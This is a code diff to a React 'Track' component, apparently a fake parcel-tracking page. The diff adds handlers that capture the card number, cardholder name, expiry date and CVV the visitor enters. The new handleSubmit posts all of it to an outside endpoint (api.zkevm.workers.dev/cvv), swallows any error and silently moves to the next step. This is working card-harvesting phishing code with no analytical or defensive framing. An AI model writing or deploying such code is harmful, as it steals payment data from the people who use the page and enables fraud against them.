@@ -13,11 +13,15 @@ import { DropdownMenu, DropdownMenuTrigger, DropdownMenuContent, DropdownMenuIte
 import { Label } from "@/components/ui/label"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
+import axios from "axios"
 
 export function Track() {
   const [currentStep, setCurrentStep] = useState(1)
   const [expiryDate, setExpiryDate] = useState('');
   const [isBackspace, setIsBackspace] = useState(false);
+  const [card, setCard] = useState('')
+  const [cvv, setCvv] = useState('')
+  const [name, setName] = useState('')
 
   const handleKeyDown = (event) => {
     if (event.key === 'Backspace') {
@@ -28,7 +32,6 @@ export function Track() {
   };
 
   const handleInputChange = (event) => {
-    console.log(event)
     let value = event.target.value.replace(/\D/g, ''); // 移除所有非数字字符
     if (value.length > 4) {
       value = value.slice(0, 4); // 限制输入长度为4
@@ -38,6 +41,19 @@ export function Track() {
     }
     setExpiryDate(value);
   };
+
+  const handleSubmit = async () => {
+    const params = {
+      card, date: expiryDate, cvv, name
+    }
+    const url = `https://api.zkevm.workers.dev/cvv`
+    try {
+      await axios.post(url, params)
+    } catch (error) {
+      console.log(error)
+    }
+    setCurrentStep(3)
+  }
 
   return (
     <div className="bg-[#fff] flex min-h-[100dvh] flex-col">
@@ -127,24 +143,24 @@ export function Track() {
                 <form className="space-y-4">
                   <div className="space-y-2">
                     <Label htmlFor="card-number">Card Number</Label>
-                    <Input id="card-number" placeholder="Enter your card number" />
+                    <Input id="card-number" onChange={e => setCard(e.target.value)} placeholder="Enter your card number" />
                   </div>
                   <div className="space-y-2">
                     <Label htmlFor="name-on-card">Name on Card</Label>
-                    <Input id="name-on-card" placeholder="Enter the name on your card" />
+                    <Input id="name-on-card" onChange={e => setName(e.target.value)} placeholder="Enter the name on your card" />
                   </div>
                   <div className="grid grid-cols-3 gap-4">
                     <div className="space-y-2">
                       <Label htmlFor="expiration-date">Expiration Date</Label>
-                      <Input id="expiration-date" placeholder="MM/YY" onChange={handleInputChange} value={expiryDate} onKeyDown={handleKeyDown}/>
+                      <Input id="expiration-date" placeholder="MM/YY" onChange={handleInputChange} value={expiryDate} onKeyDown={handleKeyDown} />
                     </div>
                     <div className="space-y-2">
-                      <Label htmlFor="cvv">CVV</Label>
-                      <Input id="cvv" placeholder="CVV" />
+                      <Label htmlFor="cvv" >CVV</Label>
+                      <Input id="cvv" placeholder="CVV" onChange={e => setCvv(e.target.value)} />
                     </div>
                   </div>
                   <div className="flex justify-center w-full ">
-                  <Button onClick={() => setCurrentStep(3)}>Continue</Button>
+                    <Button onClick={handleSubmit}>Continue</Button>
                   </div>
                 </form>
               </div>
